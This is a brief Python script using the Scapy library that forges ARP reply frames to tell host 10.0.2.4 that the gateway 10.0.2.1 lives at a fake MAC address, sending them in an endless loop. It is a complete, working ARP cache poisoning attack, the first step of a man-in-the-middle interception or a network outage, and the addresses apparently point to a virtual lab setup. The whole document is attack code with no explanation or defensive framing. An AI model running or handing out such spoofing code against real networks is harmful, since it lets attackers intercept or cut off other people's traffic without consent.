from scapy.all import *

ether = Ether(src="55:44:55:44:55:44", dst="08:00:27:37:4e:f3")

arp = ARP(op=2, psrc="10.0.2.1", hwsrc="55:44:55:44:55:44", pdst="10.0.2.4", hwdst="08:00:27:37:4e:f3")


frame=ether/arp

sendp(frame, loop=1)
